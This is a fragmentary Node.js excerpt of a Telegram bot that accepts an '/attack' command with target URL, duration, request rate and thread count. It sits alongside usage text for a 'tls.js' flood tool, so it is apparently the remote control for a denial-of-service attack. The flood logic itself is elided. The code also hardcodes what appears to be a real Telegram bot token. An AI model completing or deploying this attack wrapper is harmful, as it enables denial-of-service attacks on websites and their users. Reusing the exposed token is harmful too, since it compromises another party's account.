...
const bot = new Telegraf('7138899903:AAETJyxgv3R_-t-ib1RUj8NP7M5W27DubHA');
...
if (process.argv.length < 5) {
    console.log(`Mariana_web_official > Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://tls.mrrage.xyz 500 8 1`);
    process.exit();
}
...
function initiateAttack(ctx) {
    // Parse command arguments
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 4) {
        ctx.reply('Usage: /attack URL TIME REQ_PER_SEC THREADS');
        return;
    }

    const [target, time, Rate, threads] = args;
    const parsedTarget = url.parse(target);

    // Your existing logic here...
    
    ctx.reply('Attack initiated!');
}

// Register command handler for the /attack command
bot.command('attack', initiateAttack);
